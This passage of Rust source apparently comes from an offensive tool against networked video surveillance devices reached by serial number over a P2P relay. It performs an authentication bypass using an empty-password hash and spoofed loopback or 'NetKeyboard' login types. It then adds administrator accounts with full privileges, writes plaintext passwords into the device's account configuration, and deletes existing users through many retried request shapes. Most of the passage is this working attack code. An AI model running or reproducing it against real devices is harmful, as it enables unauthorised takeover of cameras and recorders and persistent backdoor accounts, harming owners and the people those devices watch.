    let timeout = Duration::from_secs(5);
    let mut result = Err("DHIP deleteUser failed".into());

    let mut name = user_name.clone();
    let list_req = json!({"id": 10, "magic": "0x1234", "method": "userManager.getUserInfoAll",
        "params": "null", "session": session_id});
    if let Some(t) = dhip_call(sock, pcp_session, &dhip, &list_req.to_string(), timeout).await {
        if let Ok(v) = serde_json::from_str::<Value>(&t) {
            if let Some(arr) = v.get("params").and_then(|p| p.get("users")).and_then(|u| u.as_array()) {
                if let Some(obj) = arr.iter().find(|u| {
                    if let Some(n) = &name {
                        u.get("Name").and_then(|x| x.as_str()).unwrap_or("") == n
                    } else {
                        u.get("Id").and_then(|x| x.as_u64()).unwrap_or(0) as u32 == user_id.unwrap_or(0)
                    }
                }) {
                    name = obj.get("Name").and_then(|n| n.as_str()).map(|s| s.to_string());
                }
            }
        }
    }
    let user_id = user_id.unwrap_or(0);
    if args.verbose { eprintln!("[debug] DHIP delete resolved name: {:?}", name); }

    let variant_shapes: Vec<Value> = vec![
        json!({"name": name.as_deref().unwrap_or("")}),
        json!({"user": {"Id": user_id, "Name": name.as_deref().unwrap_or("")}}),
        json!({"user": {"Id": user_id}}),
        json!({"user": {"Name": name.as_deref().unwrap_or("")}}),
        json!({"user": {"Id": user_id, "Name": name.as_deref().unwrap_or("")}, "id": user_id}),
        json!({"Id": user_id, "Name": name.as_deref().unwrap_or("")}),
    ];
    for params in variant_shapes {
        let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.deleteUser",
            "params": params, "session": session_id});
        if args.verbose { eprintln!("[debug] DHIP deleteUser: {}", req); }
        if let Some(t) = dhip_call(sock, pcp_session, &dhip, &req.to_string(), timeout).await {
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    println!("  [+] user Id={} ({}) deleted via DHIP", user_id, name.as_deref().unwrap_or("?"));
                    result = Ok(());
                    break;
                }
                if args.verbose { eprintln!("[debug] DHIP deleteUser failed: {}", t); }
            }
        }
    }

    let _ = dhip_call(sock, pcp_session, &dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// DHIP addUser + configManager.setConfig (Account table with plaintext password).
async fn dhip_add_user_with_account(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    pw_hash: &str,
    args: &Args,
) -> Result<(), String> {
    let timeout = Duration::from_secs(5);

    // Query device's supported authority list
    let authority_list = dhip_get_authority_list(sock, pcp_session, dhip, session_id, timeout).await;

    let group = if args.group == "user" { "user" } else { "admin" };
    let authority_list: Vec<String> = if group == "user" {
        authority_list
            .into_iter()
            .filter(|a| a.starts_with("Monitor") || a.starts_with("Replay"))
            .collect()
    } else {
        authority_list
    };
    let types: &[&str] = if group == "user" {
        &["Normal"]
    } else {
        &["Admin", "Operator", "Normal"]
    };

    let mut all_same_code = true;
    let mut first_code: i64 = 0;

    for utype in types {
        let al = authority_list.clone();
        let user_obj = json!({
            "Name": &args.user, "Password": pw_hash,
            "Group": group, "Memo": &args.memo, "Type": utype,
            "AuthorityList": al,
        });
        let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.addUser",
            "params": {"user": user_obj}, "session": session_id});
        if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
            if args.verbose { eprintln!("[debug] DHIP addUser(Type={}) response: {}", utype, t); }
            if let Ok(v) = serde_json::from_str::<Value>(&t) {
                if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                    println!("  [+] user added via DHIP (Type={})", utype);
                    let set_params = json!({"name": "Account", "table": {"User": [{
                        "Name": &args.user, "Password": &args.password,
                        "Group": group, "Memo": &args.memo, "Type": utype,
                        "passwordType": "Default",
                        "AuthorityList": authority_list,
                    }]}});
                    let set_req = json!({"id": 220, "magic": "0x1234", "method": "configManager.setConfig",
                        "params": set_params, "session": session_id});
                    if let Some(t) = dhip_call(sock, pcp_session, dhip, &set_req.to_string(), timeout).await {
                        if t.contains("result\":true") {
                            println!("  [+] Account table updated with plaintext password");
                        }
                    }
                    return Ok(());
                }
                let err_str = v.get("error").and_then(|e| e.get("message")).and_then(|m| m.as_str()).unwrap_or("");
                if err_str.to_lowercase().contains("exist") || t.to_lowercase().contains("exist") {
                    println!("  [!] user '{}' already exists on device, skipping", &args.user);
                    return Ok(());
                }
                let code = v.get("error").and_then(|e| e.get("code")).and_then(|c| c.as_i64()).unwrap_or(0);
                if *utype == "Admin" {
                    first_code = code;
                } else if code != first_code {
                    all_same_code = false;
                }
            }
        }
    }

    if args.verbose { eprintln!("[debug] DHIP addUser all_same_code={} first_code={}", all_same_code, first_code); }

    // Do NOT guess "already exists" from the error code alone: on some devices a
    // brand-new user also fails with the same error (e.g. 268632079). Confirm the
    // user is really present via getUserInfoAll before declaring it a duplicate.
    if dhip_user_exists(sock, pcp_session, dhip, session_id, &args.user, timeout).await {
        println!("  [!] user '{}' already exists on device, skipping", &args.user);
        return Ok(());
    }

    Err("all DHIP addUser variants failed".into())
}

/// Query userManager.getUserInfoAll via DHIP and check whether a user name exists.
async fn dhip_user_exists(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    name: &str,
    timeout: Duration,
) -> bool {
    let req = json!({"id": 100, "magic": "0x1234", "method": "userManager.getUserInfoAll",
        "params": {}, "session": session_id});
    if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
        if let Ok(v) = serde_json::from_str::<Value>(&t) {
            if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                if let Some(arr) = v.get("params").and_then(|p| p.get("users")).and_then(|u| u.as_array()) {
                    return arr.iter().any(|u| u.get("Name").and_then(|n| n.as_str()) == Some(name));
                }
            }
        }
    }
    false
}

/// DHIP getAuthorityList — queried from device, with Smart Manager fallback.
async fn dhip_get_authority_list(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dhip: &Mutex<DhipSession>,
    session_id: u32,
    timeout: Duration,
) -> Vec<String> {
    let req = json!({"id": 101, "magic": "0x1234", "method": "userManager.getAuthorityList",
        "params": {}, "session": session_id});
    if let Some(t) = dhip_call(sock, pcp_session, dhip, &req.to_string(), timeout).await {
        if let Ok(v) = serde_json::from_str::<Value>(&t) {
            if v.get("result").and_then(|r| r.as_bool()).unwrap_or(false) {
                if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                    let list: Vec<String> = params.iter()
                        .filter_map(|s| s.as_str().map(String::from))
                        .collect();
                    if !list.is_empty() {
                        return list;
                    }
                }
            }
        }
    }
    // Fallback: Smart Manager authority list from sniff log analysis
    vec![
        "Monitor".into(), "Monitor_01".into(), "Monitor_02".into(),
        "Monitor_03".into(), "Monitor_04".into(),
        "Replay".into(), "Replay_01".into(), "Replay_02".into(),
        "Replay_03".into(), "Replay_04".into(),
        "AuthUserMag".into(), "AuthSysCfg".into(), "AuthSysInfo".into(),
        "AuthManuCtr".into(), "AuthStoreCfg".into(), "AuthEventCfg".into(),
        "AuthNetCfg".into(), "AuthRmtDevice".into(), "AuthSecurity".into(),
        "AuthBackup".into(), "AuthMaintence".into(),
    ]
}

/// Perform DHIP challenge and return the numeric realm.
async fn dhp_challenge(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    args: &Args,
    probe_timeout: Duration,
) -> Option<(u32, String)> {
    let bind_timeout = Duration::from_secs(15);
    let realm_id = match ptcp_bind(sock, pcp_session, 5000, bind_timeout).await {
        Some(r) => r,
        None => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: ptcp_bind on 5000 failed (no Status reply from peer)");
            }
            return None;
        }
    };

    let dhip = Arc::new(Mutex::new(DhipSession::new(realm_id)));

    let login1 = json!({
        "id": 1, "magic": "0x1234", "method": "global.login",
        "params": {
            "clientType": "Web3.0",
            "ipAddr": "127.0.0.1", "loginType": "Direct",
            "password": "", "userName": &args.admin_user,
        },
        "session": 0,
    });

    let resp1 = match dhip_call(sock, pcp_session, &dhip, &login1.to_string(), probe_timeout).await {
        Some(r) => r,
        None => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: dhip_call (global.login) timed out or no reply");
            }
            return None;
        }
    };
    let val1: Value = match serde_json::from_str(&resp1) {
        Ok(v) => v,
        Err(e) => {
            if args.verbose {
                eprintln!("[debug] dhp_challenge: bad JSON in login reply: {} raw={:?}", e, resp1);
            }
            return None;
        }
    };
    if args.verbose {
        eprintln!("[debug] dhp_challenge: login reply: {}", resp1);
    }
    let realm = val1.get("params")?.get("realm")?.as_str()?.to_string();

    Some((realm_id, realm))
}

// ---- HTTP/RPC2 Flow (uses DHIP numeric realm for the password hash) ----

async fn http_try_add_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    dh_realm: &str,
    port: u16,
    args: &Args,
    _probe_timeout: Duration,
) -> Result<(), String> {
    if args.verbose {
        eprintln!("[debug] HTTP addUser using port {}", port);
    }
    let bind_timeout = Duration::from_secs(15);
    let realm_id = ptcp_bind(sock, pcp_session, port, bind_timeout).await
        .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;

    let host = format!("127.0.0.1:{}", port);
    let timeout = Duration::from_secs(10);

    // Step 1: HTTP login challenge
    let login1 = json!({
        "method": "global.login",
        "params": {
            "userName": &args.admin_user,
            "password": "",
            "clientType": "Web3.0",
            "loginType": "Direct",
        },
        "id": 10000,
    });

    let resp1 = http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
        &login1.to_string(), timeout, "").await
        .ok_or("HTTP login challenge timeout")?;

    let resp1_body = http_extract_body(&resp1)
        .ok_or("No body in HTTP challenge response")?;

    let val1: Value = serde_json::from_str(resp1_body)
        .map_err(|e| format!("bad JSON in HTTP challenge: {}", e))?;

    if val1.get("result").and_then(|v| v.as_bool()).unwrap_or(false) {
        let session = val1.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
        let result = http_add_user(sock, pcp_session, realm_id, &host, &session, dh_realm, args).await;
        let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return result;
    }

    let session = val1.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let http_realm = val1.get("params").and_then(|p| p.get("realm")).and_then(|v| v.as_str()).unwrap_or("");

    if session.is_empty() {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("no session in HTTP challenge".into());
    }

    // Use http_realm for the bypass hash, but dh_realm for the addUser password hash
    if args.verbose {
        eprintln!("[debug] HTTP login realm: {:?}", http_realm);
        eprintln!("[debug] Using DHIP realm for addUser hash: {:?}", dh_realm);
    }

    // Step 2: HTTP bypass login (same empty_password_hash as DHIP)
    let http_random = val1.get("params").and_then(|p| p.get("random")).and_then(|v| v.as_str()).unwrap_or("");
    let hash = empty_password_hash(&args.admin_user, http_realm, http_random);
    let bypasses = [
        ("Loopback", "Local", "Admin"),
        ("Direct", "NetKeyboard", "Admin"),
        ("Loopback", "Local", "Default"),
        ("Direct", "NetKeyboard", "Default"),
    ];

    let mut login_ok = false;

    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, http_realm, http_random, &args.admin_pass);
        let login2 = json!({
            "method": "global.login",
            "session": &session,
            "params": {
                "userName": &args.admin_user,
                "password": pw_hash,
                "ipAddr": "127.0.0.1",
                "loginType": "Loopback",
                "clientType": "Local",
                "authorityType": "Default",
                "passwordType": "Default",
            },
            "id": 10001,
        });
        if let Some(t) = http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
            &login2.to_string(), timeout, &session).await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if args.verbose { eprintln!("[debug] HTTP login via password"); }
                        login_ok = true;
                    }
                }
            }
        }
    }

    if !login_ok {
        for (login_type, client_type, authority) in &bypasses {
            let login2 = json!({
                "method": "global.login",
                "session": &session,
                "params": {
                    "userName": &args.admin_user,
                    "password": hash,
                    "ipAddr": "127.0.0.1",
                    "loginType": login_type,
                    "clientType": client_type,
                    "authorityType": authority,
                    "passwordType": "Default",
                },
                "id": 10001,
            });
        if let Some(t) = http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
            &login2.to_string(), timeout, &session).await
        {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            if args.verbose { eprintln!("[debug] HTTP login via {}/{} ({})", client_type, login_type, authority); }
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("HTTP bypass login failed".into());
    }

    let result = http_add_user(sock, pcp_session, realm_id, &host, &session, dh_realm, args).await;
    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// HTTP addUser using the given realm (should be DHIP numeric realm).
async fn http_add_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    realm: &str,
    args: &Args,
) -> Result<(), String> {
    let timeout = Duration::from_secs(10);
    let pw_hash = http_adduser_password_hash(&args.user, realm, &args.password);

    if args.verbose {
        eprintln!("[debug] HTTP addUser hash: MD5({}:{}:{}) = {}", &args.user, realm, &args.password, pw_hash);
    }

    // Get device's supported authority list (like Smart Manager does)
    let authority_list = http_get_authority_list(sock, pcp_session, realm_id, host, session, timeout).await;

    let group = if args.group == "user" { "user" } else { "admin" };
    let authority_list: Vec<String> = if group == "user" {
        authority_list
            .into_iter()
            .filter(|a| a.starts_with("Monitor") || a.starts_with("Replay"))
            .collect()
    } else {
        authority_list
    };
    let types: &[&str] = if group == "user" {
        &["Normal"]
    } else {
        &["Normal", "Admin", "Operator"]
    };

    for utype in types {
        let params = json!({"user": {
            "Name": &args.user,
            "Password": pw_hash,
            "Group": group,
            "Sharable": true,
            "Reserved": false,
            "Memo": &args.memo,
            "Type": utype,
            "MaxMonitorChannels": -1,
            "MacOnly": "",
            "AuthorityList": authority_list,
        }});

        let body = json!({
            "method": "userManager.addUser",
            "session": session,
            "params": params,
            "id": 101,
        });

        if let Some(t) = http_call(sock, pcp_session, realm_id, host, "/RPC2",
            &body.to_string(), timeout, session).await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        println!("  [+] user added via HTTP/RPC2 (Type={})", utype);
                        return Ok(());
                    }
                    let err_str = v.get("error").and_then(|e| e.get("message")).and_then(|m| m.as_str()).unwrap_or("");
                    if err_str.to_lowercase().contains("exist") || b.to_lowercase().contains("exist") {
                        println!("  [!] user '{}' already exists on device, skipping", &args.user);
                        return Ok(());
                    }
                    eprintln!("[debug] HTTP addUser(Type={}) failed: {}", utype, b);
                }
            }
        }
    }

    // Do NOT guess "already exists" from the error code alone (false positives on
    // some devices). Confirm the user is really present via getUserInfoAll first.
    if http_user_exists(sock, pcp_session, realm_id, host, session, &args.user, timeout).await {
        println!("  [!] user '{}' already exists on device, skipping", &args.user);
        return Ok(());
    }

    Err("all HTTP addUser variants failed".into())
}

/// Query userManager.getUserInfoAll via HTTP and check whether a user name exists.
async fn http_user_exists(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    name: &str,
    timeout: Duration,
) -> bool {
    let body = json!({"method": "userManager.getUserInfoAll", "session": session, "params": {}, "id": 102});
    if let Some(t) = http_call(sock, pcp_session, realm_id, host, "/RPC2", &body.to_string(), timeout, session).await {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(arr) = v.get("params").and_then(|p| p.get("users")).and_then(|u| u.as_array()) {
                        return arr.iter().any(|u| u.get("Name").and_then(|n| n.as_str()) == Some(name));
                    }
                }
            }
        }
    }
    false
}

/// Query device for supported authority list via userManager.getAuthorityList.
/// Falls back to a hardcoded list (from Smart Manager sniff log) on failure.
async fn http_get_authority_list(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    timeout: Duration,
) -> Vec<String> {
    let body = json!({
        "method": "userManager.getAuthorityList",
        "session": session,
        "params": {},
        "id": 100,
    });

    if let Some(t) = http_call(sock, pcp_session, realm_id, host, "/RPC2",
        &body.to_string(), timeout, session).await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                    if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                        let list: Vec<String> = params.iter()
                            .filter_map(|s| s.as_str().map(String::from))
                            .collect();
                        if !list.is_empty() {
                            return list;
                        }
                    }
                }
            }
        }
    }

    // Fallback: Smart Manager authority list from sniff log analysis
    vec![
        "Monitor".into(), "Monitor_01".into(), "Monitor_02".into(),
        "Monitor_03".into(), "Monitor_04".into(),
        "Replay".into(), "Replay_01".into(), "Replay_02".into(),
        "Replay_03".into(), "Replay_04".into(),
        "AuthUserMag".into(), "AuthSysCfg".into(), "AuthSysInfo".into(),
        "AuthManuCtr".into(), "AuthStoreCfg".into(), "AuthEventCfg".into(),
        "AuthNetCfg".into(), "AuthRmtDevice".into(), "AuthSecurity".into(),
        "AuthBackup".into(), "AuthMaintence".into(),
    ]
}

async fn http_logout(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    timeout: Duration,
) {
    let body = json!({
        "method": "global.logout",
        "session": session,
        "params": "null",
        "id": 99,
    });
    let _ = http_call(sock, pcp_session, realm_id, host, "/RPC2",
        &body.to_string(), timeout, session).await;
}

/// Delete the user with the given numeric Id on each device.
async fn delete_users(
    serials: &[String],
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => { eprintln!("  [-] P2P handshake failed: {}", e); continue; }
        };

        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        let (dh_realm_id, dh_realm) = match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
            Some(x) => x,
            None => { eprintln!("  [-] DHIP challenge failed"); continue; }
        };
        if args.verbose { eprintln!("[debug] DHIP realm: {:?}", dh_realm); }

        ptcp_disconnect(sock, pcp_session, dh_realm_id).await;

        let mut ok = false;
        for &port in &[80u16, 5000] {
            match http_try_delete_user(sock, pcp_session, &dh_realm, port, user_id, user_name.clone(), args).await {
                Ok(()) => { ok = true; break; }
                Err(e) => { if args.verbose { eprintln!("[debug] delete on port {} failed: {}", port, e); } }
            }
        }
        if !ok {
            if args.verbose { eprintln!("[debug] HTTP delete failed, trying DHIP delete"); }
            match dhip_try_delete_user(sock, pcp_session, user_id, user_name.clone(), args, probe_timeout).await {
                Ok(()) => { ok = true; }
                Err(e) => { if args.verbose { eprintln!("[debug] DHIP delete failed: {}", e); } }
            }
        }
        if !ok {
            let label = user_name.as_deref().map(|n| format!("'{}'", n)).unwrap_or_else(|| format!("{}", user_id.unwrap_or(0)));
            eprintln!("  [-] Failed to delete user {}", label);
        }
    }
    Ok(())
}

/// Delete a user via HTTP/RPC2 on a specific port (bypass login first).
async fn http_try_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    _dh_realm: &str,
    port: u16,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
) -> Result<(), String> {
    if args.verbose {
        eprintln!("[debug] HTTP deleteUser (Id={:?}, Name={:?}) using port {}", user_id, user_name, port);
    }
    let bind_timeout = Duration::from_secs(15);
    let realm_id = ptcp_bind(sock, pcp_session, port, bind_timeout).await
        .ok_or_else(|| format!("PTCP bind failed on port {}", port))?;

    let host = format!("127.0.0.1:{}", port);
    let timeout = Duration::from_secs(15);

    let login1 = json!({
        "method": "global.login",
        "params": {
            "userName": &args.admin_user,
            "password": "",
            "clientType": "Web3.0",
            "loginType": "Direct",
        },
        "id": 10000,
    });

    let resp1 = http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
        &login1.to_string(), timeout, "").await
        .ok_or("HTTP login challenge timeout")?;
    let resp1_body = http_extract_body(&resp1)
        .ok_or("No body in HTTP challenge response")?;
    let val1: Value = serde_json::from_str(resp1_body)
        .map_err(|e| format!("bad JSON in HTTP challenge: {}", e))?;

    let session = val1.get("session").and_then(|v| v.as_str()).unwrap_or("").to_string();

    // Already logged in (some firmware returns result:true immediately)
    if val1.get("result").and_then(|v| v.as_bool()).unwrap_or(false) {
        let result = http_delete_user(sock, pcp_session, realm_id, &host, &session, user_id, user_name, args).await;
        let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return result;
    }

    if session.is_empty() {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("no session in HTTP challenge".into());
    }

    let http_realm = val1.get("params").and_then(|p| p.get("realm")).and_then(|v| v.as_str()).unwrap_or("");
    let http_random = val1.get("params").and_then(|p| p.get("random")).and_then(|v| v.as_str()).unwrap_or("");
    let hash = empty_password_hash(&args.admin_user, http_realm, http_random);

    let mut login_ok = false;
    let bypasses = [("Loopback", "Local"), ("Direct", "NetKeyboard")];
    if !args.admin_pass.is_empty() {
        let pw_hash = password_hash(&args.admin_user, http_realm, http_random, &args.admin_pass);
        let login2 = json!({
            "method": "global.login", "session": &session, "params": {
                "userName": &args.admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
                "loginType": "Loopback", "clientType": "Local",
                "authorityType": "Default", "passwordType": "Default",
            }, "id": 10001,
        });
        if let Some(t) = http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
            &login2.to_string(), timeout, &session).await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        login_ok = true;
                    }
                }
            }
        }
    }

    if !login_ok {
        for (login_type, client_type) in &bypasses {
            let login2 = json!({
                "method": "global.login", "session": &session, "params": {
                    "userName": &args.admin_user, "password": hash, "ipAddr": "127.0.0.1",
                    "loginType": login_type, "clientType": client_type,
                    "authorityType": "Default", "passwordType": "Default",
                }, "id": 10001,
            });
            if let Some(t) = http_call(sock, pcp_session, realm_id, &host, "/RPC2_Login",
                &login2.to_string(), timeout, &session).await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("HTTP bypass login failed".into());
    }

    let result = http_delete_user(sock, pcp_session, realm_id, &host, &session, user_id, user_name, args).await;
    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Send userManager.deleteUser (resolves the full user object from Id or Name first).
async fn http_delete_user(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_id: Option<u32>,
    user_name: Option<String>,
    args: &Args,
) -> Result<(), String> {
    let timeout = Duration::from_secs(15);

    // Resolve user object via getUserInfoAll (by Id or by Name)
    let user_obj = if let Some(n) = &user_name {
        http_find_user_object_by_name(sock, pcp_session, realm_id, host, session, n, timeout, args.verbose).await
    } else {
        http_find_user_object(sock, pcp_session, realm_id, host, session, user_id.unwrap_or(0), timeout, args.verbose).await
    };
    let user_id = user_obj.as_ref().and_then(|u| u.get("Id")).and_then(|x| x.as_u64()).map(|v| v as u32).unwrap_or(user_id.unwrap_or(0));
    let name = user_obj.as_ref().and_then(|u| u.get("Name")).and_then(|n| n.as_str()).map(String::from).or(user_name);
    match &name {
        Some(n) => if args.verbose { eprintln!("[debug] delete target -> Name '{}' (Id {})", n, user_id); },
        None => if args.verbose { eprintln!("[debug] user Id={} not found in user list", user_id); },
    }

    // deleteUser param variants, most-specific first
    let mut variants: Vec<Value> = Vec::new();
    variants.extend([
        json!({"name": name}),
        json!({"name": name, "id": user_id}),
    ]);
    if let Some(u) = &user_obj {
        variants.push(json!({"user": u}));
    }
    variants.extend([
        json!({"user": {"Id": user_id, "Name": name}}),
        json!({"user": {"Name": name}}),
        json!({"user": {"Id": user_id}}),
        json!({"Id": user_id}),
        json!({"account": {"Id": user_id, "Name": name}}),
        json!({"account": {"Name": name}}),
        json!({"account": {"Id": user_id}}),
        json!({"user": {"Id": user_id, "Name": name}, "id": user_id}),
        json!({"users": [{"Id": user_id, "Name": name}]}),
        json!({"user": {"Id": user_id, "Name": name}, "session": session}),
        json!([{"Id": user_id, "Name": name}]),
        json!([{"user": {"Id": user_id, "Name": name}}]),
    ]);
    if user_obj.is_none() {
        variants.extend([
            json!({"users": [{"Id": user_id}]}),
            json!({"users": [{"Id": user_id, "Name": name}]}),
        ]);
    }

    for params in variants {
        let body = json!({
            "method": "userManager.deleteUser",
            "session": session,
            "params": params,
            "id": 101,
        });
        if args.verbose { eprintln!("[debug] deleteUser: {}", body); }
        if let Some(t) = http_call(sock, pcp_session, realm_id, host, "/RPC2",
            &body.to_string(), timeout, session).await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        println!("  [+] user Id={} ({}) deleted via HTTP/RPC2", user_id, name.as_deref().unwrap_or("?"));
                        return Ok(());
                    }
                    if args.verbose { eprintln!("[debug] deleteUser variant failed: {}", b); }
                }
            }
        }
    }

    // Fallback: alternate delete method names
    let alt_methods = ["accountManager.deleteAccount", "userManager.deleteUsers"];
    for method in alt_methods {
        for params in [
            json!({"name": name}),
            json!({"user": {"Id": user_id}}),
            json!({"account": {"Name": name}}),
        ] {
            let body = json!({"method": method, "session": session, "params": params, "id": 101});
            if args.verbose { eprintln!("[debug] {}: {}", method, body); }
            if let Some(t) = http_call(sock, pcp_session, realm_id, host, "/RPC2",
                &body.to_string(), timeout, session).await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            println!("  [+] user Id={} ({}) deleted via {}", user_id, name.as_deref().unwrap_or("?"), method);
                            return Ok(());
                        }
                        if args.verbose { eprintln!("[debug] {} failed: {}", method, b); }
                    }
                }
            }
        }
    }

    Err(format!("deleteUser failed for Id {}", user_id))
}

/// Fetch the user list and return the full user object whose "Id" matches, if any.
async fn http_find_user_object(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_id: u32,
    timeout: Duration,
    verbose: bool,
) -> Option<Value> {
    let body = json!({
        "method": "userManager.getUserInfoAll",
        "session": session,
        "params": {},
        "id": 102,
    });
    if let Some(t) = http_call(sock, pcp_session, realm_id, host, "/RPC2",
        &body.to_string(), timeout, session).await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if let Some(arr) = v.get("params").and_then(|p| p.get("users")).and_then(|u| u.as_array()) {
                    for user in arr {
                        let id = user.get("Id").and_then(|x| x.as_u64()).unwrap_or(0) as u32;
                        if id == user_id {
                            return Some(user.clone());
                        }
                    }
                }
                if verbose { eprintln!("[debug] user Id={} not found in getUserInfoAll", user_id); }
            } else if verbose {
                eprintln!("[debug] getUserInfoAll: bad JSON");
            }
        }
    } else if verbose {
        eprintln!("[debug] getUserInfoAll: http_call returned None (timeout)");
    }
    None
}

/// Fetch the user list and return the full user object whose "Name" matches, if any.
async fn http_find_user_object_by_name(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    realm_id: u32,
    host: &str,
    session: &str,
    user_name: &str,
    timeout: Duration,
    verbose: bool,
) -> Option<Value> {
    let body = json!({
        "method": "userManager.getUserInfoAll",
        "session": session,
        "params": {},
        "id": 102,
    });
    if let Some(t) = http_call(sock, pcp_session, realm_id, host, "/RPC2",
        &body.to_string(), timeout, session).await
    {
        if let Some(b) = http_extract_body(&t) {
            if let Ok(v) = serde_json::from_str::<Value>(b) {
                if let Some(arr) = v.get("params").and_then(|p| p.get("users")).and_then(|u| u.as_array()) {
                    for user in arr {
                        let nm = user.get("Name").and_then(|x| x.as_str()).unwrap_or("");
                        if nm == user_name {
                            return Some(user.clone());
                        }
                    }
                }
                if verbose { eprintln!("[debug] user '{}' not found in getUserInfoAll", user_name); }
            } else if verbose {
                eprintln!("[debug] getUserInfoAll: bad JSON");
            }
        }
    } else if verbose {
        eprintln!("[debug] getUserInfoAll: http_call returned None (timeout)");
    }
    None
}

use chrono::Datelike;
use chrono::Timelike;

